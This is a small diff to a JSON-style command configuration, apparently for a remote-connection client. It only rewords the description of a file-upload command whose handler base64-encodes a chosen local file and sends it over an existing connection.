@@ -108,7 +108,7 @@
             "command-file": "up.py",
             "command-arguments": {"file":"__file__","path":"__path__","new_name":"__new_name__","data":"__data__"},
             "command-default": {"old_path":"{self.SCRIPT_FILENAME}"},
-            "command-description": "up a file",
+            "command-description": "Upload a file",
              "action": {
                 "type": "function",
                 "handler": "con.connect(cli='up', data=base64.b64encode(open(cmd_parts, 'rb').read()).decode('utf-8') ,file=cmd_parts, path=pwd, new_name=other_parts[0])"
